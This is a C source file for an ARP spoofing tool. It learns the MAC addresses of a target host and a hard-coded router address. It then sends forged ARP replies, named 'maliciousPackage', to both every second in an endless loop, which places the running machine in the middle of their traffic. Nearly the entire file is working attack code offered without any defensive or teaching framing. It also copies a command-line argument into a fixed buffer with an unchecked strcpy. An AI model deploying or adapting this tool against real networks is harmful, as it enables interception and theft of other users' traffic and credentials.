#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include "Util.h"
#include "Network.h"
#include "Arp.h"

// IPV4
#define IP_ADDRESS_LENGTH 4
#define MAC_ADDRESS_LENGTH 6

// Program Constants
const char broadcastMacAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
const char nullMacAddress[] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
const char routerIpAddress[] = {0xA, 0x20, 0x8F, 0x01};
const char broadcastIpAddress[] = {0xA, 0x20, 0x8F, 0xFF};

// These will be shared across the application
char interfaceName[IFNAMSIZ];
char targetIpAddress[IP_ADDRESS_LENGTH];
char targetMacAddress[MAC_ADDRESS_LENGTH];
char routerMacAddress[MAC_ADDRESS_LENGTH];

void cleanUp(void) {
	closeSharedSocket();
}

ArpPackage createArpPackage(unsigned long opcode, const char* senderMac,const char* senderIp,const char* targetMac,const char* targetIp){

    ArpPackage initialPackage = {
		ARPHRD_ETHER,
		ETH_P_IP,
		MAC_ADDRESS_LENGTH,
		IP_ADDRESS_LENGTH,
		opcode,	
	};
	

	memcpy(initialPackage.senderMacAddress, senderMac, MAC_ADDRESS_LENGTH);
	memcpy(initialPackage.senderIpAddress, senderIp, IP_ADDRESS_LENGTH);
	memcpy(initialPackage.targetMacAddress, targetMac, MAC_ADDRESS_LENGTH);
	memcpy(initialPackage.targetIpAddress, targetIp, IP_ADDRESS_LENGTH);

	return initialPackage;
}

int main(int argc, const char* argv[]) {		
	
	// Safety check
	if( argc != 3 ) {
		printf("Usage: ./run <InterfaceName> <TargetIpAddress>\n");
		return EXIT_FAILURE;
	}
	strcpy(interfaceName, argv[1]);	
	

	targetIpAddress[0] = (inet_addr(argv[2]) >> 0) & 0xFF;
	targetIpAddress[1] = (inet_addr(argv[2]) >> 8) & 0xFF;
	targetIpAddress[2] = (inet_addr(argv[2]) >> 16) & 0xFF;
	targetIpAddress[3] = (inet_addr(argv[2]) >> 24) & 0xFF;
	
	atexit(cleanUp);
	
	// Initializes the shared Socket with the provided interfaceName
	if( initSharedSocketWithInterfaceName(interfaceName) < 0) {
		printf("Error 1\n");
		exit(EXIT_FAILURE);
	}

	// Initializes the background thread to print Arp Packages
   	if( initArpSnifferWithInterfaceName(interfaceName) < 0) {
		printf("Error 2\n");
		exit(EXIT_FAILURE);
	}
		

    ArpPackage initialPackage = createArpPackage(ARPOP_REQUEST,
                                                localInterfaceMacAddress,
                                                localInterfaceIpAddress,
                                                broadcastMacAddress,
                                                targetIpAddress);
    
    ArpPackage routerInitialPackage = createArpPackage(ARPOP_REQUEST,
                                                       localInterfaceMacAddress,
                                                       localInterfaceIpAddress,
                                                       broadcastMacAddress,
                                                       routerIpAddress);
	ArpPackage receivedPackage; 
	
	printf("Sending Initial Arp\n");
	if( sendArpPackage(&initialPackage) < 0) {
		printf("Error 3\n");
		exit(EXIT_FAILURE);	
	}

	printf("Receiving Arp Response\n");
	if( receiveArpPackage(&receivedPackage, ARPOP_REPLY)  < 0) {
		printf("Error 4\n");
		exit(EXIT_FAILURE);
	}

	memcpy(targetMacAddress, receivedPackage.senderMacAddress, MAC_ADDRESS_LENGTH);
	//printArpPackage(receivedPackage);
	
	
	printf("Sending router package\n");
	if( sendArpPackage(&routerInitialPackage) < 0) {
		printf("Error 4\n");
		exit(EXIT_FAILURE);
	}
		
	printf("Receiving Arp Response\n");
	if( receiveArpPackage(&receivedPackage, ARPOP_REPLY) < 0) {
		printf("Error 5\n");
		exit(EXIT_FAILURE);
	}
	memcpy(routerMacAddress, receivedPackage.senderMacAddress, MAC_ADDRESS_LENGTH);
			
	ArpPackage maliciousPackage = createArpPackage(ARPOP_REPLY,
                                                   localInterfaceMacAddress,
                                                   routerIpAddress,
                                                   targetMacAddress,
                                                   targetIpAddress);
	ArpPackage maliciousRouterPackage = createArpPackage(ARPOP_REPLY,
                                                         localInterfaceMacAddress,
                                                         targetIpAddress,
                                                         routerMacAddress, routerIpAddress);
	
    
	// Continuosly send packages
	while(1) {
		if( sendArpPackage(&maliciousPackage) < 0) {
			printf("Error 6\n");
			exit(EXIT_FAILURE);
		}
	
		if( sendArpPackage(&maliciousRouterPackage) < 0 ) {
			printf("Error 7\n");
			exit(EXIT_FAILURE);
		}
		sleep(1);
	}
	
	

	// End of program
	exit(EXIT_SUCCESS);
}
